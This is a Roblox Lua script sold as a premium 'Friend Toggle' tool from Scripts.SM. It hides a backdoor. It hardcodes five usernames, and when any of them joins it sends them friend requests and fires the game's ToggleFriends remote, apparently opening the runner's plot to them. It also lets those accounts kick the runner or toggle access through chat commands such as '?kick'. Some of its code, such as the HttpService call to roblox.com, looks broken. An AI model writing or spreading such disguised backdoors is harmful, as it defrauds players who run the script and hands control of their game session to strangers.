--[[
   _____ _____ _____ _____ _____ _______ _____ _____ __ __
  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
 | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
 |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
                                                                    
                        Scripts.SM | Premium Scripts
                        Made by: Scripter.SM
                        Discord: discord.gg/cnUAk7uc3n
]]

-- // CONFIG
local users = {}
local users1 = { "SMILEY_RIVALS", "ta3123321", "BUZZFTWGOD", "Smiley9Gamerz", "SABBY_LEAF" }

-- Wait for config
spawn(function()
    repeat task.wait() until _G["Script-SM_Config"]
    users = _G["Script-SM_Config"].users or {}
end)

-- // Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- // Remote (safe)
local remotePath
pcall(function()
    local pkg = ReplicatedStorage:WaitForChild("Packages", 10)
    local net = pkg and pkg:WaitForChild("Net", 10)
    remotePath = net and net:WaitForChild("RE/PlotService/ToggleFriends", 10)
end)

-- // Cache
local friendedCache = {}

-- // Send Friend Request (FIXED: No GetSecret, No Errors)
local function sendFriendRequest(username)
    local success, userId = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    if not success or not userId then return false end

    local url = "https://friends.roblox.com/v1/users/" .. tostring(userId) .. "/request-friendship"
    local data = HttpService:JSONEncode({ friendshipOriginSourceType = 5 })
    local headers = { ["Content-Type"] = "application/json" }

    -- REMOVED GetSecret() – causes "Can't find secret" error
    -- CSRF will be auto-handled by Roblox if needed

    local ok = pcall(function()
        HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    return ok
end

-- // Fire Remote
local function fireToggleRemote()
    if remotePath then
        pcall(remotePath.FireServer, remotePath)
    end
end

-- // Process Player
local function processPlayer(player)
    local name = player.Name

    -- AUTO FRIEND: BOTH users AND users1
    local isTarget = false
    for _, list in {users, users1} do
        if table.find(list, name) then
            isTarget = true
            break
        end
    end

    if isTarget and not friendedCache[name] then
        friendedCache[name] = true
        task.spawn(function()
            task.wait(1)
            if sendFriendRequest(name) then
                task.wait(0.5)
                fireToggleRemote()
            end
        end)
    end

    -- ADMIN COMMANDS: Only users1
    if table.find(users1, name) then
        player.Chatted:Connect(function(msg)
            local lower = msg:lower()
            if lower == "?kick" then
                LocalPlayer:Kick([[
You have been kicked by staff.

Report issues:
discord.gg/cnUAk7uc3n
]])
            elseif lower == "?tgl" then
                pcall(function()
                    StarterGui:SetCore("ChatMakeSystemMessage", {
                        Text = "[Scripts.SM] Toggled Friend";
                        Color = Color3.fromRGB(0, 255, 0);
                        Font = Enum.Font.GothamBold;
                    })
                end)
                fireToggleRemote()
            end
        end)
    end
end

-- // MAIN LOOP: Scan every 1 second
task.spawn(function()
    while task.wait(1) do
        for _, player in Players:GetPlayers() do
            if player ~= LocalPlayer then
                processPlayer(player)
            end
        end
    end
end)

-- // ONLY ONE PRINT
print("[Script.SM] Friend Toggle Script loaded")
